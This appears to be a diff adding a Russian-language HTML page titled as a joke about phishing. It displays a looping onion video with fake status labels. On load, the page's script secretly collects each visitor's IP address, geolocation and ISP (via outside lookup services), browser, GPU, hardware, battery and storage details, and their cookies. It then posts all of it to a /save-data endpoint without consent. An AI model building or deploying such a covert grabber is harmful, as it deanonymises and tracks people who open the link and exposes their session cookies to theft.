@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>это типа фишинг ебать</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a1a, #2d2d2d, #1a1a1a);
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+            body::before {
+                content: '';
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: radial-gradient(circle at 20% 30%, rgba(100, 100, 100, 0.1) 0%, transparent 50%), radial-gradient(circle at 80% 70%, rgba(80, 80, 80, 0.1) 0%, transparent 50%);
+                z-index: 1;
+            }
+
+        .scan-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, rgba(150, 150, 150, 0.8), transparent);
+            animation: scan 4s linear infinite;
+            z-index: 2;
+        }
+
+        @keyframes scan {
+            0% {
+                top: 0%;
+            }
+
+            100% {
+                top: 100%;
+            }
+        }
+
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: linear-gradient(rgba(100, 100, 100, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(100, 100, 100, 0.1) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 1;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% {
+                transform: translate(0, 0);
+            }
+
+            100% {
+                transform: translate(50px, 50px);
+            }
+        }
+
+        .video-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70vmin;
+            height: 70vmin;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 0 100px rgba(0, 0, 0, 0.8), 0 0 50px rgba(100, 100, 100, 0.3), inset 0 0 50px rgba(0, 0, 0, 0.5);
+            z-index: 3;
+            border: 1px solid rgba(150, 150, 150, 0.3);
+            transition: all 0.5s ease;
+        }
+
+            .video-container:hover {
+                box-shadow: 0 0 120px rgba(0, 0, 0, 0.9), 0 0 70px rgba(120, 120, 120, 0.4), inset 0 0 30px rgba(0, 0, 0, 0.6);
+                transform: translate(-50%, -50%) scale(1.02);
+            }
+
+            .video-container::before {
+                content: '';
+                position: absolute;
+                top: -2px;
+                left: -2px;
+                right: -2px;
+                bottom: -2px;
+                background: linear-gradient(45deg, rgba(100, 100, 100, 0.8), rgba(150, 150, 150, 0.4), rgba(100, 100, 100, 0.8));
+                border-radius: 22px;
+                z-index: -1;
+                animation: borderPulse 3s ease-in-out infinite;
+            }
+
+        @keyframes borderPulse {
+            0%, 100% {
+                opacity: 0.5;
+            }
+
+            50% {
+                opacity: 0.8;
+            }
+        }
+
+        #onionVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .corner-dots {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 4;
+        }
+
+        .corner-dot {
+            position: absolute;
+            width: 15px;
+            height: 15px;
+            border: 2px solid rgba(150, 150, 150, 0.7);
+            border-radius: 50%;
+        }
+
+            .corner-dot:nth-child(1) {
+                top: 15px;
+                left: 15px;
+            }
+
+            .corner-dot:nth-child(2) {
+                top: 15px;
+                right: 15px;
+            }
+
+            .corner-dot:nth-child(3) {
+                bottom: 15px;
+                left: 15px;
+            }
+
+            .corner-dot:nth-child(4) {
+                bottom: 15px;
+                right: 15px;
+            }
+
+        .data-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: rgba(180, 180, 180, 0.7);
+            font-size: 12px;
+            font-family: monospace;
+            letter-spacing: 1px;
+            z-index: 3;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                opacity: 0.7;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: rgba(150, 150, 150, 0.3);
+            border-radius: 50%;
+            animation: particleFloat linear infinite;
+        }
+
+        @keyframes particleFloat {
+            0% {
+                transform: translateY(100vh) translateX(0);
+            }
+
+            100% {
+                transform: translateY(-100px) translateX(100px);
+            }
+        }
+
+        .status-dots {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            gap: 10px;
+            z-index: 3;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            animation: statusPulse 2s infinite;
+        }
+
+            .status-dot:nth-child(1) {
+                background: rgba(100, 200, 100, 0.8);
+                animation-delay: 0s;
+            }
+
+            .status-dot:nth-child(2) {
+                background: rgba(100, 150, 200, 0.8);
+                animation-delay: 0.5s;
+            }
+
+            .status-dot:nth-child(3) {
+                background: rgba(200, 100, 100, 0.8);
+                animation-delay: 1s;
+            }
+
+        @keyframes statusPulse {
+            0%, 100% {
+                opacity: 0.3;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 1;
+                transform: scale(1.3);
+            }
+        }
+
+        .save-indicator {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            color: rgba(180, 180, 180, 0.5);
+            font-size: 11px;
+            font-family: monospace;
+            letter-spacing: 2px;
+            z-index: 3;
+        }
+
+        @media (max-width: 768px) {
+            .video-container {
+                width: 90vmin;
+                height: 90vmin;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="scan-line"></div>
+    <div class="grid-overlay"></div>
+    <div class="particles" id="particles"></div>
+
+    <div class="status-dots">
+        <div class="status-dot"></div>
+        <div class="status-dot"></div>
+        <div class="status-dot"></div>
+    </div>
+
+    <div class="save-indicator">DATA_SAVED</div>
+
+    <div class="video-container">
+        <div class="corner-dots">
+            <div class="corner-dot"></div>
+            <div class="corner-dot"></div>
+            <div class="corner-dot"></div>
+            <div class="corner-dot"></div>
+        </div>
+        <video id="onionVideo" autoplay loop muted playsinline>
+            <source src="onion.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <div class="data-indicator" id="dataIndicator">COLLECTING...</div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const video = document.getElementById('onionVideo');
+            const dataIndicator = document.getElementById('dataIndicator');
+
+            createParticles();
+            collectAndSaveData();
+
+            video.addEventListener('loadeddata', function () {
+                video.play();
+            });
+
+            async function createParticles() {
+                const container = document.getElementById('particles');
+                for (let i = 0; i < 30; i++) {
+                    const particle = document.createElement('div');
+                    particle.className = 'particle';
+                    particle.style.left = `${Math.random() * 100}vw`;
+                    particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                    particle.style.animationDelay = `${Math.random() * 5}s`;
+                    container.appendChild(particle);
+                }
+            }
+
+            async function collectAndSaveData() {
+                let collectedData = {};
+
+                for (let i = 0; i < 5; i++) {
+                    dataIndicator.textContent = `COLLECTING${'.'.repeat(i % 4)}`;
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+
+                try {
+                    collectedData = await gatherCompleteData();
+
+                    const response = await fetch('/save-data', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(collectedData)
+                    });
+
+                    if (response.ok) {
+                        dataIndicator.textContent = "SAVED";
+                        dataIndicator.style.color = "rgba(100, 200, 100, 0.8)";
+                    } else {
+                        dataIndicator.textContent = "ERROR";
+                        dataIndicator.style.color = "rgba(200, 100, 100, 0.8)";
+                    }
+                } catch (error) {
+                    dataIndicator.textContent = "FAILED";
+                    dataIndicator.style.color = "rgba(200, 100, 100, 0.8)";
+                }
+            }
+
+            async function gatherCompleteData() {
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    network: {},
+                    browser: {},
+                    device: {},
+                    hardware: {},
+                    storage: {},
+                    location: {}
+                };
+
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    data.network.ip = ipData.ip;
+
+                    try {
+                        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        const geoData = await geoResponse.json();
+                        data.location.city = geoData.city;
+                        data.location.region = geoData.region;
+                        data.location.country = geoData.country_name;
+                        data.network.isp = geoData.org;
+                        data.network.asn = geoData.asn;
+                    } catch (e) {
+                        data.location.status = "geo_failed";
+                    }
+                } catch (e) {
+                    data.network.ip = "unavailable";
+                }
+
+                if (navigator.connection) {
+                    data.network.connectionType = navigator.connection.effectiveType;
+                    data.network.downlink = navigator.connection.downlink;
+                    data.network.rtt = navigator.connection.rtt;
+                    data.network.saveData = navigator.connection.saveData;
+                }
+
+                const ua = navigator.userAgent;
+                data.browser.name = getBrowserName(ua);
+                data.browser.version = getBrowserVersion(ua);
+                data.browser.fullAgent = ua;
+                data.browser.platform = navigator.platform;
+                data.browser.language = navigator.language;
+                data.browser.languages = navigator.languages;
+                data.browser.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                data.device.type = getDeviceType(ua);
+                data.device.isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+
+                data.hardware.cores = navigator.hardwareConcurrency;
+                data.hardware.ram = navigator.deviceMemory;
+                data.hardware.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type
+                };
+
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.hardware.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "available";
+                    data.hardware.webgl = true;
+                } else {
+                    data.hardware.gpu = "unavailable";
+                    data.hardware.webgl = false;
+                }
+
+                data.hardware.touchPoints = navigator.maxTouchPoints;
+                data.hardware.hasGyroscope = 'Gyroscope' in window;
+                data.hardware.hasAccelerometer = 'Accelerometer' in window;
+                data.hardware.hasOrientation = 'DeviceOrientationEvent' in window;
+
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        data.hardware.battery = {
+                            level: battery.level,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) {
+                        data.hardware.battery = "permission_required";
+                    }
+                }
+
+                data.storage.cookiesEnabled = navigator.cookieEnabled;
+                data.storage.cookies = document.cookie;
+
+                try {
+                    localStorage.setItem('_test', '1');
+                    data.storage.localStorage = localStorage.getItem('_test') === '1';
+                    localStorage.removeItem('_test');
+                } catch (e) {
+                    data.storage.localStorage = false;
+                }
+
+                try {
+                    sessionStorage.setItem('_test', '1');
+                    data.storage.sessionStorage = sessionStorage.getItem('_test') === '1';
+                    sessionStorage.removeItem('_test');
+                } catch (e) {
+                    data.storage.sessionStorage = false;
+                }
+
+                data.storage.indexedDB = 'indexedDB' in window;
+                data.storage.serviceWorker = 'serviceWorker' in navigator;
+
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    try {
+                        const estimate = await navigator.storage.estimate();
+                        data.storage.quota = estimate.quota;
+                        data.storage.usage = estimate.usage;
+                        data.storage.usagePercentage = estimate.quota ? (estimate.usage / estimate.quota) * 100 : 0;
+                    } catch (e) {
+                        data.storage.estimate = "failed";
+                    }
+                }
+
+                return data;
+            }
+
+            function getBrowserName(ua) {
+                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+                if (ua.includes('Firefox')) return 'Firefox';
+                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+                if (ua.includes('Edg')) return 'Edge';
+                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+                return 'Unknown';
+            }
+
+            function getBrowserVersion(ua) {
+                const patterns = [
+                    /Chrome\/(\d+\.\d+)/,
+                    /Firefox\/(\d+\.\d+)/,
+                    /Version\/(\d+\.\d+).*Safari/,
+                    /Edg\/(\d+\.\d+)/,
+                    /OPR\/(\d+\.\d+)/
+                ];
+
+                for (const pattern of patterns) {
+                    const match = ua.match(pattern);
+                    if (match) return match[1];
+                }
+                return 'Unknown';
+            }
+
+            function getDeviceType(ua) {
+                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
+                if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Phone';
+                return 'Desktop';
+            }
+        });
+    </script>
+</body>
+</html>
